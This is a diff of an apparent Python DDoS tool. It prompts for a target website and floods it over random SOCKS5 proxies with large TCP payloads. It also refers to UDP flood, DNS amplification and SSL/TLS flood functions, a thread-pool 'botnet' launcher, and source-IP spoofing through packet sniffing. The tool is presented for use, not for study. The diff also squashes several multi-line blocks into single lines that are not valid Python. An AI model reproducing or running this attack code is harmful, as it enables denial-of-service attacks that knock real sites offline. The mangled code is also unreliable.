@@ -33,6 +33,7 @@ credit = """
 ╚════════════════════════╝
 \033[1;36m
 """
+
 print(credit)
 url = input("Enter the target website URL: ")
 parsed_url = urllib.parse.urlparse(url)
@@ -99,10 +100,10 @@ def ddos_tcp():
     while True:
         try:
             proxy_address = random.choice(proxies)
-            
+
             sock = socks.socksocket()
             sock.set_proxy(socks.SOCKS5, proxy_address.split(':')[0], int(proxy_address.split(':')[1]))
-            
+
             sock.connect((target_ip, target_port))
 
             payload = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(131072, 262144)))
@@ -163,13 +164,7 @@ def ssl_tls_flood():
         except:
             pass
 
-def create_botnet(num_bots):
-    with concurrent.futures.ThreadPoolExecutor() as executor:
-        for _ in range(num_bots):
-            executor.submit(ddos_tcp)
-            executor.submit(ddos_udp)
-            executor.submit(dns_amplification_attack)
-            executor.submit(ssl_tls_flood)
+def create_botnet(num_bots): with concurrent.futures.ThreadPoolExecutor() as executor: for _ in range(num_bots): executor.submit(ddos_tcp) executor.submit(ddos_udp) executor.submit(dns_amplification_attack) executor.submit(ssl_tls_flood)
 
 def spoof_ip(packet):
     packet[IP].src = random.choice(source_ips)
@@ -181,6 +176,4 @@ def spoof_ip(packet):
 def start_packet_sniffing():
     sniff(filter=f"tcp and dst port {target_port}", prn=spoof_ip)
 
-num_bots = int(input("Enter the number of bots to create: "))
-create_botnet(num_bots)
-start_packet_sniffing()
+num_bots = int(input("Enter the number of bots to create: ")) create_botnet(num_bots) start_packet_sniffing()
